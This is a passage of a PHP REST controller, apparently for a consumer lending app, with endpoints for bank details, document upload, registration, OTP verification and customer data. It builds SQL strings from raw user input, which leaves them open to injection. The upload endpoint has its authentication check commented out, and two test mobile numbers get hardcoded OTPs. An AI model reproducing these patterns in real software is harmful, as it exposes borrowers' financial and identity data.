    public function getIFSCMasterList_post() {

        $input_data = file_get_contents("php://input");

        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();

        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {

            $this->form_validation->set_data($post);

            $this->form_validation->set_rules("ifsc_code", "IFSC Code", "required|trim|min_length[4]");

            if ($this->form_validation->run() == FALSE) {
                return json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {

                $ifsc_code = $post['ifsc_code'];

                if (strlen($ifsc_code) >= 4) {

                    $num_rows = getnumrowsData("UPPER(bank_ifsc) as code", "tbl_bank_details", "where bank_ifsc like '$ifsc_code%'");

                    if (empty($num_rows)) {
                        return json_encode($this->response(['Status' => 0, 'Message' => "IFSC code is not avialbe. Please contact us on customer care."], REST_Controller::HTTP_OK));
                    } else {
                        return json_encode($this->response(['Status' => 1, 'Message' => "IFSC code fetched.", 'data' => $num_rows], REST_Controller::HTTP_OK));
                    }
                } else {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Please enter minimum five chars."], REST_Controller::HTTP_OK));
                }
            }
        } else {
            return json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //************ API for saving the bank details **************//
    public function qdeAppSaveBankDetails_post() {

        $input_data = file_get_contents("php://input");

        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();

        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {

            $this->form_validation->set_data($post);

            $this->form_validation->set_rules("beneficiary_name", "Beneficiary Name", "required|trim");
            $this->form_validation->set_rules("bank_name", "Bank Name", "required|trim");
            $this->form_validation->set_rules("ifsc_code", "IFSC Code", "required|trim");
            $this->form_validation->set_rules("branch", "Branch Namr", "required|trim");
            $this->form_validation->set_rules("account", "Account", "required|trim|min_length[10]|max_length[16]");
            $this->form_validation->set_rules("confirm_account", "Confirm Account", "required|trim|min_length[10]|max_length[16]");
            $this->form_validation->set_rules("account_type", "account_type", "trim");

            if ($this->form_validation->run() == FALSE) {

                return json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {

                $lead_id = $post['lead_id'];

                if (empty($lead_id)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Missing lead reference."], REST_Controller::HTTP_OK));
                }

                $num_rowsleads = getnumrowsData('customer_id,lead_status_id', 'leads', "WHERE lead_id='$lead_id' AND (lead_active='1' AND lead_deleted='0' )");

                if (empty($num_rowsleads)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Application does not exist."], REST_Controller::HTTP_OK));
                }

                if ($num_rowsleads[0]['lead_status_id'] > 1) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Your application has been moved to next step."], REST_Controller::HTTP_OK));
                }

                $beneficiary_name = !empty($post['beneficiary_name']) ? $post['beneficiary_name'] : "";
                $confirm_account = !empty($post['confirm_account']) ? $post['confirm_account'] : "";
                $account = !empty($post['account']) ? $post['account'] : "";
                $bank_name = !empty($post['bank_name']) ? strtoupper($post['bank_name']) : "";
                $ifsc_code = !empty($post['ifsc_code']) ? strtoupper($post['ifsc_code']) : "";
                $branch = !empty($post['branch']) ? strtoupper($post['branch']) : "";
                $account_type = !empty($post['account_type']) ? strtoupper($post['account_type']) : "";

                if ($confirm_account != $account) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Enter correct confirm account."], REST_Controller::HTTP_OK));
                }

                $empquery = $this->db->select('id')->where('lead_id', $lead_id)->from('customer_banking')->get();
                $empquery = $empquery->row();
                $emp_id = !empty($empquery->id) ? $empquery->id : 0;

                $customer_banking_data = array(
                    'lead_id' => $lead_id,
                    'beneficiary_name' => $beneficiary_name,
                    'bank_name' => $bank_name,
                    'ifsc_code' => $ifsc_code,
                    'branch' => $branch,
                    'account' => $account,
                    'confirm_account' => $confirm_account,
                    'account_type' => $account_type,
                );

                if (!empty($emp_id)) {
                    $customer_banking_data['updated_on'] = created_on;
                    $this->db->where('id', $emp_id)->update('customer_banking', $customer_banking_data);
                } else {
                    $customer_banking_data['created_on'] = created_on;
                    $this->db->insert('customer_banking', $customer_banking_data);
                }

                return json_encode($this->response(['Status' => 1, 'Message' => "Bank Details saved successfully."], REST_Controller::HTTP_OK));
            }
        } else {
            return json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    public function qdeAppUploadDocuments_post() {
        //        header('Content-Type: application/json; charset=utf-8');
        $input_data = file_get_contents("php://input");

        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();

        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST') { // && $header_validation
            $this->form_validation->set_data($post);
            $this->form_validation->set_rules("lead_id", "Lead ID", "trim");
            $this->form_validation->set_rules("docs_id", "Docs Type", "required|trim");
            $this->form_validation->set_rules("password", "Password", "trim");
            $this->form_validation->set_rules("file", "File", "required|trim");

            if ($this->form_validation->run() == FALSE) {
                return json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {

                $lead_id = $post['lead_id'];
                $docs_id = $post['docs_id'];
                $docs_file = $post['file'];
                $docs_password = $post['password'];

                if (empty($lead_id)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Missing lead reference."], REST_Controller::HTTP_OK));
                }

                if (empty($docs_id)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Missing document type."], REST_Controller::HTTP_OK));
                }

                if (empty($docs_file)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Missing document file."], REST_Controller::HTTP_OK));
                }

                $num_rowsleads = getnumrowsData('customer_id,pancard,mobile,lead_status_id', 'leads', "WHERE lead_id='$lead_id' AND (lead_active='1' AND lead_deleted='0')");

                if (empty($num_rowsleads)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Application does not exist."], REST_Controller::HTTP_OK));
                }

                $leadDetails = $num_rowsleads[0];

                if ($leadDetails['lead_status_id'] > 1) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Your application has been moved to next step."], REST_Controller::HTTP_OK));
                }

                $num_rowsleads = getnumrowsData('docs_type,docs_sub_type', 'docs_master', "WHERE id='$docs_id'");

                if (empty($num_rowsleads)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Invalid Dcoument."], REST_Controller::HTTP_OK));
                }
                $docs_master = $num_rowsleads[0];
                $image_name = date("YmdHis") . "_" . $lead_id . "_" . $docs_id;

                $ext = '.jpeg';

                if (in_array($docs_id, array(6, 7))) {
                    $ext = '.pdf';
                }

                $imgUrl = $image_name . $ext;
                $image_upload_dir = UPLOAD_PATH . $imgUrl;

                $flag = file_put_contents($image_upload_dir, base64_decode($docs_file));
                $ip = !empty($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';

                if ($flag) {
                    $data = [
                        "lead_id" => $lead_id,
                        "docs_master_id" => $docs_id,
                        "customer_id" => $leadDetails['customer_id'],
                        "pancard" => $leadDetails['pancard'],
                        "mobile" => $leadDetails['mobile'],
                        "docs_type" => $docs_master['docs_type'],
                        "sub_docs_type" => $docs_master['docs_sub_type'],
                        "pwd" => !empty($docs_password) ? $docs_password : "",
                        "file" => $imgUrl,
                        "ip" => $ip,
                        "created_on" => created_on
                    ];

                    $this->db->insert('docs', $data);

                    $docsId = $this->db->insert_id();

                    if (!empty($docsId)) {
                        return json_encode($this->response(['Status' => 1, 'Message' => 'Document uploaded successfully.', 'docs_id' => $docsId], REST_Controller::HTTP_OK));
                    } else {
                        return json_encode($this->response(['Status' => 0, 'Message' => 'Failed to save Docs. Try Again.'], REST_Controller::HTTP_OK));
                    }
                } else {
                    return json_encode($this->response(['Status' => 0, 'Message' => 'Failed to save Docs. Try Again'], REST_Controller::HTTP_OK));
                }
            }
        } else {
            return json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //************** Api for Save Reference Address************************//
    public function qdeAppSaveReferenceDetails_post() {

        $input_data = file_get_contents("php://input");

        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();

        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {

            $this->form_validation->set_data($post);

            $this->form_validation->set_rules("ref_name", "Name", "required|trim");
            $this->form_validation->set_rules("relation_type", "Relation Type", "required|trim");
            $this->form_validation->set_rules("mobile", "Mobile", "required|trim|numeric|is_natural|min_length[10]|max_length[10]|regex_match[/^[0-9]+$/]");
            $this->form_validation->set_rules("lead_id", "Lead Id", "required|trim");

            if ($this->form_validation->run() == FALSE) {
                return json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {

                $lead_id = $post['lead_id'];

                if (empty($lead_id)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Missing lead reference."], REST_Controller::HTTP_OK));
                }

                $num_rowsleads = getnumrowsData('customer_id,lead_status_id', 'leads', "WHERE lead_id='$lead_id' AND (lead_active='1' AND lead_deleted='0' )");

                if (empty($num_rowsleads)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Application does not exist."], REST_Controller::HTTP_OK));
                }

                if ($num_rowsleads[0]['lead_status_id'] > 1) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Your application has been moved to next step."], REST_Controller::HTTP_OK));
                }

                $empquery = $this->db->select('lcr_id')->where('lcr_lead_id', $lead_id)->from('lead_customer_references')->get();
                $empquery = $empquery->row();
                $emp_id = !empty($empquery->lcr_id) ? $empquery->lcr_id : 0;

                $reference_details = array(
                    'lcr_lead_id' => $post['lead_id'],
                    'lcr_name' => strtoupper($post['ref_name']),
                    'lcr_relationType' => $post['relation_type'],
                    'lcr_mobile' => $post['mobile'],
                    'lcr_created_on' => created_on,
                );

                if (empty($emp_id)) {
                    $reference_details['lcr_created_on'] = created_on;
                    $this->db->insert('lead_customer_references', $reference_details);
                } else {
                    $reference_details['lcr_updated_on'] = created_on;
                    $this->db->where('lcr_id', $emp_id)->update('lead_customer_references', $reference_details);
                }

                $conditions = ['customer_lead_id' => $lead_id];
                $fetch = 'first_name, sur_name, mobile';
                $query = $this->Tasks->selectdata($conditions, $fetch, 'lead_customer');
                $sql = $query->row();
                $first_name = $sql->first_name;
                $last_name = $sql->sur_name;
                $mobile = $sql->mobile;
                $gender = $sql->gender;

                $referenceCode = $this->Tasks->generateReferenceCode($lead_id, $first_name, $last_name, $mobile);

                $table2 = 'leads';
                $column = 'lead_id';
                $update_id = $post['lead_id'];
                $leadData = array(
                    'term_and_condition' => 'YES',
                    'lead_reference_no' => $referenceCode,
                );

                $this->CurdMode->globel_update($table2, $leadData, $update_id, $column);

                $dataSMS = [
                    'title' => ($gender == "MALE" || $gender == "Male") ? "Mr." : "Ms.",
                    'name' => ($first_name) ? $first_name : "User",
                    'mobile' => $mobile,
                    'referenceCode' => $referenceCode,
                ];

                $this->Tasks->sendOTPAppliedSuccessfully1($dataSMS);

                return json_encode($this->response(['Status' => 1, 'Message' => 'References Details saved successfull'], REST_Controller::HTTP_OK));
            }
        } else {
            return json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    /* Loanwalle App First Page Submit */

    public function qdeAppSaveRegistration_post() {
        $input_data = file_get_contents("php://input");

        $post = $this->security->xss_clean(json_decode($input_data, true));

        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }



        $headers = $this->input->request_headers();
        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {
            $this->form_validation->set_data($post);
            $this->form_validation->set_rules("mobile", "Mobile", "required|trim|numeric|is_natural|min_length[10]|max_length[10]|regex_match[/^[0-9]+$/]");
            $this->form_validation->set_rules("first_name", "First Name", "required|trim");
            $this->form_validation->set_rules("city_id", "City Name", "required|trim");
            $this->form_validation->set_rules("email", "Email", "required|trim|regex_match[/([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})/]");

            if ($this->form_validation->run() == FALSE) {
                return json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {
                $first_name = strtoupper($post['first_name']);
                $mobile = $post['mobile'];
                $email = strtoupper($post['email']);
                $city_id = $post['city_id'];
                $coordinates = !empty($post['coordinates']) ? $post['coordinates'] : '';
                $source_id = !empty($post['source_id']) ? $post['source_id'] : 2;
                $utm_source = !empty($post['utm_source']) ? $post['utm_source'] : '';
                $utm_campaign = !empty($post['utm_campaign']) ? $post['utm_campaign'] : '';
                $lead_mobile_android_id = !empty($post['lead_mobile_android_id']) ? $post['lead_mobile_android_id'] : '';
                $ip = !empty($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
                $otp = rand(1000, 9999);

                if ($mobile == "9953931000") { //Google Play credentials. Do not touch this. by Shubham Agrawal 2022-01-01
                    $otp = 9308;
                } else if ($mobile == "9560807913") { //Hardcoded otp testing... donot remove
                    $otp = 1989;
                }

                $getStateName = $this->MasterModel->getStateIdfromCityId($city_id);
                $city_state_id = $getStateName[0]['id'];

                $getStateName1 = getcustId('master_state', 'm_state_id', $city_state_id, 'm_state_name');
                $getCityName1 = getcustId('master_city', 'm_city_id', $city_id, 'm_city_name');

                if ($source_id == 8) {
                    $data_source_name = "AppLoan4Smile";
                    $lead_data_source_id = 8;
                } else if ($source_id == 17) {
                    $data_source_name = "APPTOPUP";
                    $lead_data_source_id = 17;
                } else {
                    $data_source_name = "AppLoanwalle";
                    $lead_data_source_id = 2;
                }

                $insertDataLeads = array(
                    'first_name' => $first_name,
                    'mobile' => $mobile,
                    'otp' => $otp,
                    'email' => $email,
                    'company_id' => 1,
                    'product_id' => 1,
                    'lead_status_id' => 1,
                    'user_type' => 'NEW',
                    'stage' => 'S1',
                    'status' => 'LEAD-NEW',
                    'source' => $data_source_name,
                    'lead_entry_date' => date('Y-m-d'),
                    'lead_data_source_id' => $lead_data_source_id,
                    'ip' => $ip,
                    'lead_mobile_android_id' => $lead_mobile_android_id,
                    'qde_consent' => 'Y',
                    'created_on' => created_on,
                    'city_id' => $city_id,
                    'state_id' => $city_state_id,
                    'coordinates' => $coordinates,
                    'utm_source' => $utm_source,
                    'utm_campaign' => $utm_campaign,
                );

                $this->db->insert('leads', $insertDataLeads);

                $lead_id = $this->db->insert_id();

                if (empty($lead_id)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Some error occurred due to data set. Please try again."], REST_Controller::HTTP_OK));
                }


                $insertLeadsCustomer = array(
                    'customer_lead_id' => $lead_id,
                    'first_name' => $first_name,
                    'mobile' => $mobile,
                    'email' => $email,
                    'state_id' => $city_state_id,
                    'city_id' => $city_id,
                    'created_date' => created_on
                );

                $this->db->insert('lead_customer', $insertLeadsCustomer);

                $insertDataOTP = array(
                    'lot_lead_id' => $lead_id,
                    'lot_mobile_no' => $mobile,
                    'lot_mobile_otp' => $otp,
                    'lot_mobile_otp_type' => 2,
                    'lot_otp_trigger_time' => created_on,
                );

                $this->db->insert('leads_otp_trans', $insertDataOTP);

                $lead_otp_id = $this->db->insert_id();

                $data = [
                    "name" => $first_name,
                    "mobile" => $mobile,
                    "otp" => $otp
                ];

                $this->Tasks->sendOTPForUserRegistrationVerification($data);

                $array = ['Status' => 1, 'Message' => 'Registeration successfull.', 'lead_id' => $lead_id, 'city_id' => $city_id, 'state_id' => $city_state_id, "city_name" => $getCityName1, "state_nane" => $getStateName1];

                if ($lead_otp_id) {
                    return json_encode($this->response($array, REST_Controller::HTTP_OK));
                } else {
                    return json_encode($this->response(['Status' => 0, 'Message' => 'Failed.'], REST_Controller::HTTP_OK));
                }
            }
        } else {
            return json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    /* New Function Verify OTP Api */

    public function qdeAppOtpVerify_post() {

        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();
        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {
            $this->form_validation->set_data($post);
            $this->form_validation->set_rules("mobile", "Mobile", "required|trim|numeric|is_natural|min_length[10]|max_length[10]|regex_match[/^[0-9]+$/]");
            $this->form_validation->set_rules("lead_id", "Lead ID", "required|trim");
            $this->form_validation->set_rules("otp", "OTP", "required|trim|numeric|is_natural|min_length[4]|max_length[4]|regex_match[/^[0-9]+$/]");
            //            $this->form_validation->set_rules("first_name", "First Name", "required|trim");
            if ($this->form_validation->run() == FALSE) {
                return json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {

                $mobile = !empty($post['mobile']) ? $post['mobile'] : 0;
                $lead_id = $post['lead_id'];
                $otp = $post['otp'];

                $query = $this->db->select('lead_id, mobile, lead_status_id')->where(['lead_id' => $lead_id])->from('leads')->get();

                if ($query->num_rows() > 0) {

                    $query = $query->row();

                    $empquery = $this->db->select('id')->where('lead_id', $lead_id)->from('customer_employment')->get();
                    $empquery = $empquery->row();
                    $emp_id = !empty($empquery->id) ? $empquery->id : 0;
                    $lead_status_id = $query->lead_status_id;

                    if ($lead_status_id > 1) {
                        return json_encode($this->response(['Status' => 0, 'Message' => 'Your application has been moved to next step.'], REST_Controller::HTTP_OK));
                    }

                    $last_row = $this->db->select('lot_id,lot_mobile_otp')->where('lot_mobile_no', $mobile)->where('lot_lead_id', $lead_id)->from('leads_otp_trans')->order_by('lot_id', 'desc')->limit(1)->get()->row();

                    $lastotp = $last_row->lot_mobile_otp;
                    $lot_id = $last_row->lot_id;

                    if ($lastotp != $otp) {
                        return json_encode($this->response(['Status' => 0, 'Message' => 'OTP verification failed. Please try again.'], REST_Controller::HTTP_OK));
                    }


                    $cif_query = $this->db->select('*')->where('cif_mobile', $mobile)->from('cif_customer')->get();

                    if ($cif_query->num_rows() > 0) {
                        $cif_result = $cif_query->row();

                        $isdisbursedcheck = $cif_result->cif_loan_is_disbursed;

                        if ($isdisbursedcheck > 0) {
                            $user_type = "REPEAT";
                        } else {
                            $user_type = "NEW";
                        }

                        $gender = "MALE";

                        if ($cif_result->cif_gender == 2) {
                            $gender = "FEMALE";
                        }

                        $update_data_lead_customer = [
                            'mobile_verified_status' => "YES",
                            'middle_name' => $cif_result->cif_middle_name,
                            'sur_name' => $cif_result->cif_sur_name,
                            'gender' => $gender,
                            'dob' => $cif_result->cif_dob,
                            'pancard' => $cif_result->cif_pancard,
                            'alternate_email' => $cif_result->cif_office_email,
                            'alternate_mobile' => $cif_result->cif_alternate_mobile,
                            'current_house' => $cif_result->cif_residence_address_1,
                            'current_locality' => $cif_result->cif_residence_address_2,
                            'current_landmark' => $cif_result->cif_residence_landmark,
                            'current_residence_type' => $cif_result->cif_residence_type,
                            'cr_residence_pincode' => $cif_result->cif_residence_pincode,
                            'current_residing_withfamily' => $cif_result->cif_residence_residing_with_family,
                            'current_residence_since' => $cif_result->cif_residence_since,
                            'aa_same_as_current_address' => $cif_result->cif_aadhaar_same_as_residence,
                            'aa_current_house' => $cif_result->cif_aadhaar_address_1,
                            'aa_current_locality' => $cif_result->cif_aadhaar_address_2,
                            'aa_current_landmark' => $cif_result->cif_aadhaar_landmark,
                            'aa_cr_residence_pincode' => $cif_result->cif_aadhaar_pincode,
                            'aa_current_state_id' => $cif_result->cif_aadhaar_state_id,
                            'aa_current_city_id' => $cif_result->cif_aadhaar_city_id,
                            'aadhar_no' => $cif_result->cif_aadhaar_no,
                            'updated_at' => created_on
                        ];

                        $this->db->where('customer_lead_id', $lead_id)->update('lead_customer', $update_data_lead_customer);

                        $update_data_leads = [
                            'customer_id' => $cif_result->cif_number,
                            'pancard' => $cif_result->cif_pancard,
                            'alternate_email' => $cif_result->cif_office_email,
                            'pincode' => $cif_result->cif_residence_pincode,
                            'user_type' => $user_type,
                            'updated_on' => created_on
                        ];

                        $insert_customer_employement = [
                            'lead_id' => $lead_id,
                            'customer_id' => $cif_result->cif_number,
                            'employer_name' => $cif_result->cif_company_name,
                            'emp_pincode' => $cif_result->cif_office_pincode,
                            'emp_house' => $cif_result->cif_office_address_1,
                            'emp_street' => $cif_result->cif_office_address_2,
                            'emp_landmark' => $cif_result->cif_office_address_landmark,
                            'emp_residence_since' => $cif_result->cif_office_working_since,
                            'emp_shopNo' => $cif_result->cif_office_address_1,
                            'emp_designation' => $cif_result->cif_office_designation,
                            'emp_department' => $cif_result->cif_office_department,
                            'emp_employer_type' => $cif_result->cif_company_type_id,
                            'emp_website' => $cif_result->cif_company_website,
                            'emp_email' => $cif_result->cif_office_email,
                            'state_id' => $cif_result->cif_office_state_id,
                            'city_id' => $cif_result->cif_office_city_id,
                        ];

                        if (!empty($emp_id)) {
                            $insert_customer_employement['updated_on'] = created_on;
                            $this->db->where('id', $emp_id)->update('customer_employment', $insert_customer_employement);
                        } else {
                            $insert_customer_employement['created_on'] = created_on;
                            $this->db->insert('customer_employment', $insert_customer_employement);
                        }

                        $update_lead_otp_trans_data = [
                            'lot_otp_verify_time' => created_on,
                            'lot_otp_verify_flag' => 1,
                        ];

                        $this->db->where('lot_id', $lot_id)->update('leads_otp_trans', $update_lead_otp_trans_data);

                        $update_data_leads['lead_is_mobile_verified'] = 1;

                        $this->db->where('lead_id', $lead_id)->update('leads', $update_data_leads);

                        return json_encode($this->response(['Status' => 1, 'flag' => 1, 'Message' => 'OTP Verified.', 'lead_id' => $lead_id], REST_Controller::HTTP_OK));
                    } else {

                        $update_lead_otp_trans_data = [
                            'lot_otp_verify_time' => created_on,
                            'lot_otp_verify_flag' => 1,
                        ];

                        $update_data_lead_customer = [
                            'mobile_verified_status' => "YES",
                            'updated_at' => created_on
                        ];

                        $this->db->where('customer_lead_id', $lead_id)->update('lead_customer', $update_data_lead_customer);

                        $this->db->where('lot_id', $lot_id)->update('leads_otp_trans', $update_lead_otp_trans_data);
                        $this->db->set('lead_is_mobile_verified', 1)->where('lead_id', $lead_id)->update('leads');

                        return json_encode($this->response(['Status' => 1, 'flag' => 0, 'Message' => 'OTP Verified.', 'lead_id' => $lead_id], REST_Controller::HTTP_OK));
                    }
                } else {

                    return json_encode($this->response(['Status' => 0, 'Message' => 'Application does not exist.'], REST_Controller::HTTP_OK));
                }
            }
        } else {
            return json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    /* New Function Resend OTP Api */

    public function qdeAppResendOTP_post() {

        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();
        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {

            $lead_id = $post['lead_id'];
            $mobile = $post['mobile'];

            $table = 'leads';
            $selectdata = 'first_name as name, mobile, email';
            $where = "where lead_id = '$lead_id' and mobile= '$mobile' ";

            $num_rows = getnumrowsData($selectdata, $table, $where);

            if ($num_rows == 0) {
                return json_encode($this->response(['Status' => 0, 'Message' => 'Application does not exist.'], REST_Controller::HTTP_OK));
            } else {

                $lead_id = $post['lead_id'];
                $mobile = $post['mobile'];

                $otp = rand(1000, 9999);

                if ($mobile == "9953931000") { //Google Play credentials. Do not touch this. by Shubham Agrawal 2022-01-01
                    $otp = 9308;
                } else if ($mobile == "9560807913") { //Hardcoded otp testing... donot remove
                    $otp = 1989;
                }

                $data = [
                    "mobile" => $mobile,
                    "otp" => $otp
                ];

                $dataleads = array(
                    'otp' => $otp,
                );

                $insertDataOTP = array(
                    'lot_lead_id' => $lead_id,
                    'lot_mobile_no' => $mobile,
                    'lot_mobile_otp' => $otp,
                    'lot_mobile_otp_type' => 2,
                    'lot_otp_trigger_time' => created_on,
                );

                $this->db->insert('leads_otp_trans', $insertDataOTP);

                $res = $this->CurdMode->globel_update('leads', $dataleads, $lead_id, 'lead_id');

                if ($res) {

                    $this->Tasks->sendOTPForUserRegistrationVerification($data);

                    return json_encode($this->response(['Status' => 1, 'Message' => 'OTP resent successfull.', 'lead_id' => $lead_id], REST_Controller::HTTP_OK));
                }
            }
        } else {
            return json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    /* Save Customer Api */

    public function qdeAppSaveCustomer_post() {
        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();

        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {
            $this->form_validation->set_data($post);
            $this->form_validation->set_rules("lead_id", "Lead", "required|trim");
            $this->form_validation->set_rules("first_name", "First Name", "required|trim");
            $this->form_validation->set_rules("middle_name", "Middle Name", "trim");
            $this->form_validation->set_rules("sur_name", "Sur Name", "trim");
            $this->form_validation->set_rules("gender", "Gender", "required|trim");
            $this->form_validation->set_rules("dob", "Date Of Birth", "trim");
            $this->form_validation->set_rules("pancard", "Pancard", "required|trim|min_length[10]|max_length[10]");
            $this->form_validation->set_rules("mobile", "Mobile No", "required|trim|min_length[10]|max_length[10]");
            //  $this->form_validation->set_rules("alternate_mobile","Alternate Mobile No","trim|min_length[10]|max_length[10]");
            $this->form_validation->set_rules("email_personal", "Personal Email", "required|trim|regex_match[/([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})/]");
            //$this->form_validation->set_rules("email_official","Official Email","trim|regex_match[/([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})/]");

            if ($this->form_validation->run() == FALSE) {
                return json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {

                $lead_id = $post['lead_id'];

                $day = date('d', strtotime($post['dob']));
                $month = date('m', strtotime($post['dob']));
                $year = date('Y', strtotime($post['dob']));
                $dateOfBirth = $year . '-' . $month . '-' . $day;
                $dob = ($dateOfBirth) ? $dateOfBirth : "";
                $first_name = strtoupper($post['first_name']);
                $middle_name = strtoupper($post['middle_name']);
                $sur_name = strtoupper($post['sur_name']);
                $email = strtoupper($post['email_personal']);
                //                $alternate_email = strtoupper($post['email_official']);
                //                $city_state_id = intval($post['state_id']);
                //                $city_id = intval($post['city']);
                //                $pincode = intval($post['pin']);
                //                $loan_amount = intval($post['loan_amount']);
                //                $obligations = intval($post['obligations']);
                //                $monthly_income = intval($post['monthly_income']);
                //                $source = strtoupper($post['source']);
                $pancard = strtoupper($post['pancard']);
                //                $utm_source = !empty($post['utm_source']) ? strtoupper($post['utm_source']) : "";
                //                $utm_campaign = !empty($post['utm_campaign']) ? strtoupper($post['utm_campaign']) : "";
                $gender = strtoupper($post['gender']);

                $table = 'leads';
                $selectdata = "customer_id,lead_status_id";
                $where = " where lead_id='$lead_id'";
                $num_rowsleads = getnumrowsData($selectdata, $table, $where);

                if (empty($num_rowsleads[0])) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Application does not exist."], REST_Controller::HTTP_OK));
                }

                $leadDetails = $num_rowsleads[0];

                if ($leadDetails['lead_status_id'] > 1) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Application has been moved to next step."], REST_Controller::HTTP_OK));
                }


                if (empty($leadDetails['customer_id'])) {

                    if (!empty($pancard)) {
                        $cif_query = $this->db->select('*')->where('cif_pancard', $pancard)->from('cif_customer')->get();

                        if ($cif_query->num_rows() > 0) {

                            $cif_result = $cif_query->row();

                            $isdisbursedcheck = $cif_result->cif_loan_is_disbursed;

                            if ($isdisbursedcheck > 0) {
                                $user_type = "REPEAT";
                            } else {
                                $user_type = "NEW";
                            }

                            $update_data_lead_customer = [
                                'email' => $email,
                                'middle_name' => $middle_name,
                                'sur_name' => $sur_name,
                                'gender' => $gender,
                                'dob' => $dob,
                                'current_house' => $cif_result->cif_residence_address_1,
                                'current_locality' => $cif_result->cif_residence_address_2,
